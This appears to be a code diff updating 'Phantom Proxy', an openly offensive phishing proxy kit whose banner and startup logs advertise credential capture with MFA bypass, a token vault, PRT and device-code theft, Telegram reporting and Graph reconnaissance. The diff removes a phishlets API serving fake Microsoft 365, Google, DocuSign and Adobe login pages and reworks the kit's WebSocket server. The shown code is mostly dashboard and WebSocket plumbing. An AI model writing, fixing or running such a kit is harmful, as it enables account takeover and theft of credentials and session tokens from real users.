@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.4 — WEBSOCKET FIXED EDITION
+// 🥔 PHANTOM PROXY v10.5 — WEBSOCKET FIXED (NO PHISHLETS)
 // ============================================================
-// 🔥 ALL FEATURES: Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets + Capture + MFA + WEBSOCKETS
+// 🔥 FEATURES: Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Capture + MFA + WEBSOCKETS
 // ============================================================
 
 const http = require("http");
@@ -1634,40 +1634,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Phishlets ──
-    if (apiPath === '/api/phishlets') {
-        try {
-            const phishlets = {
-                microsoft: { name: 'Microsoft 365', file: 'microsoft.html', entryPoint: '/login', enabled: true },
-                google: { name: 'Google', file: 'google.html', entryPoint: '/accounts', enabled: true },
-                docusign: { name: 'DocuSign', file: 'docusign.html', entryPoint: '/signin', enabled: false },
-                adobe: { name: 'Adobe', file: 'adobe.html', entryPoint: '/login', enabled: false }
-            };
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ success: true, phishlets }));
-        } catch (err) {
-            res.writeHead(500);
-            res.end(JSON.stringify({ error: err.message }));
-        }
-        return;
-    }
-
-    if (apiPath === '/api/phishlets/toggle' && req.method === 'POST') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', async () => {
-            try {
-                const { id, enabled } = JSON.parse(body);
-                res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ success: true, message: `${id} ${enabled ? 'enabled' : 'disabled'}` }));
-            } catch (err) {
-                res.writeHead(500);
-                res.end(JSON.stringify({ error: err.message }));
-            }
-        });
-        return;
-    }
-
     // ── Graph Recon ──
     if (apiPath === '/api/recon' && req.method === 'POST') {
         let body = '';
@@ -2343,11 +2309,12 @@ h1 { font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }
 });
 
 // ============================================================
-// 🔌 WEBSOCKET SERVER (FULLY WORKING)
+// 🔌 WEBSOCKET SERVER (SINGLE HANDLER - FIXED)
 // ============================================================
 
 if (WebSocket) {
     try {
+        // ✅ NO 'server.on('upgrade')' - WebSocket.Server handles it automatically!
         const wss = new WebSocket.Server({ 
             server: server,
             path: '/ws'
@@ -2355,18 +2322,6 @@ if (WebSocket) {
         
         const wsClients = new Set();
         let wsConnectedCount = 0;
-        
-        // Handle WebSocket upgrade
-        server.on('upgrade', (request, socket, head) => {
-            if (request.url === '/ws') {
-                wss.handleUpgrade(request, socket, head, (ws) => {
-                    wss.emit('connection', ws, request);
-                });
-            } else {
-                // Not a WebSocket request - let it pass through
-                // Don't destroy - let the proxy handle it
-            }
-        });
         
         wss.on('connection', (ws, req) => {
             wsConnectedCount++;
@@ -2451,7 +2406,7 @@ if (WebSocket) {
 // ============================================================
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v10.4 ULTIMATE running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.5 ULTIMATE running on port ${PORT}`);
     console.log(`🔐 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: http://localhost:${PORT}/device`);
     console.log(`🔌 WebSocket: ws://localhost:${PORT}/ws`);
@@ -2461,7 +2416,6 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`🔑 Token Vault: ACTIVE`);
     console.log(`📊 Graph API: ACTIVE`);
     console.log(`📈 Analytics: ACTIVE`);
-    console.log(`🎭 Phishlets: ACTIVE`);
     console.log(`📧 Webmail: ACTIVE`);
     console.log(`📥 Credential Capture: ACTIVE (with MFA support)`);
     console.log(`✅ All features integrated — WEBSOCKETS ENABLED!`);
